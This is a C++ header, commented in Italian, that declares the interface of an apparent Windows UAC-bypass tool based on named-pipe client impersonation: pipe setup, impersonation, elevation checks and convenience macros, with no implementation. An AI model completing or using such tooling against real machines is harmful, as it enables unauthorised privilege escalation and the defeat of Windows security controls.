#ifndef UAC_BYPASS_NAMED_PIPE_IMPERSONATION_H
#define UAC_BYPASS_NAMED_PIPE_IMPERSONATION_H

#include <windows.h>
#include <string>
#include <vector>
#include "Logger.h"
#include "Config.h"

namespace uac_bypass {

// Costanti globali
constexpr DWORD PIPE_DEFAULT_BUFFER_SIZE = 4096;
constexpr DWORD PIPE_DEFAULT_TIMEOUT = 5000;  // 5 secondi
constexpr DWORD PIPE_MAX_INSTANCES = 1;

// Struttura per i dettagli della pipe
struct PipeDetails {
    std::wstring pipeName;
    HANDLE pipeHandle;
    DWORD accessMode;
    DWORD pipeMode;
    DWORD maxInstances;
    DWORD outBufferSize;
    DWORD inBufferSize;
    DWORD defaultTimeout;
};

// Struttura per il client della pipe
struct PipeClient {
    HANDLE clientHandle;
    std::wstring clientName;
    DWORD processId;
    DWORD sessionId;
    bool isElevated;
};

class NamedPipeImpersonation {
public:
    static NamedPipeImpersonation& getInstance();
    
    bool initialize();
    bool createElevatedPipe();
    bool connectAndImpersonate();
    bool cleanup();
    
    bool createNamedPipe(const std::wstring& pipeName);
    bool connectNamedPipe();
    bool disconnectNamedPipe();
    bool impersonateClient();
    
    bool writeToPipe(const std::vector<BYTE>& data);
    bool readFromPipe(std::vector<BYTE>& data);
    bool flushPipe();
    bool setPipeMode(DWORD mode);

private:
    NamedPipeImpersonation();
    ~NamedPipeImpersonation();
    NamedPipeImpersonation(const NamedPipeImpersonation&) = delete;
    NamedPipeImpersonation& operator=(const NamedPipeImpersonation&) = delete;

    bool setupPipeSecurity();
    bool setupPipeAttributes();
    bool configurePipeMode();
    bool initializePipeBuffers();

    bool waitForClient();
    bool verifyClientIdentity();
    bool getClientInfo(PipeClient& client);
    bool isClientElevated(HANDLE clientToken);

    bool protectPipe();
    bool monitorPipeAccess();
    bool validatePipeState();
    bool handlePipeError();

    bool generatePipeName();
    bool setPipeTimeout(DWORD timeout);
    bool setPipeBufferSize(DWORD size);
    bool isPipeAvailable(const std::wstring& pipeName);

    Logger& logger;
    bool initialized;
    PipeDetails pipeDetails;
    std::vector<PipeClient> connectedClients;
};

// Macro per impersonazione pipe
#define CREATE_ELEVATED_PIPE() \
    NamedPipeImpersonation::getInstance().createElevatedPipe()

#define IMPERSONATE_PIPE_CLIENT() \
    NamedPipeImpersonation::getInstance().connectAndImpersonate()

} // namespace uac_bypass

#endif // UAC_BYPASS_NAMED_PIPE_IMPERSONATION_H